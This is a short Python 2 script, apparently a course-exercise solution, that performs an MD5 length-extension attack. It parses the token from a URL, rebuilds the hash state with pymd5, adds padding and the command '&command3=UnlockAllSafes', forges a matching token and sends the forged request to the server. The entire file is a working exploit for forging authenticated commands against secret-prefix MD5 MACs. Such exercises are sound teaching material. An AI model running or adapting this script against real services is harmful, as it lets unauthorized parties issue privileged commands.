import httplib, urlparse, sys, urllib
from pymd5 import md5, padding
url = sys.argv[1]

original_url = url
startIndex = original_url.index("=") + 1
endIndex = original_url.index("&")
token = original_url[startIndex:endIndex]

length_of_m = 8 + len(original_url[(endIndex + 1):])
bits_in_m = length_of_m * 8
pad = padding(length_of_m * 8)
length_of_padding = len(pad)
bits = (length_of_m + length_of_padding) * 8

suffix = "&command3=UnlockAllSafes"

h = md5(state=(token.decode("hex")), count=bits)
h.update(suffix)
newToken = h.hexdigest()

url = original_url[:startIndex] + newToken + original_url[endIndex:] + urllib.quote(pad) + suffix

parsedUrl = urlparse.urlparse(url)
conn = httplib.HTTPSConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print conn.getresponse().read()
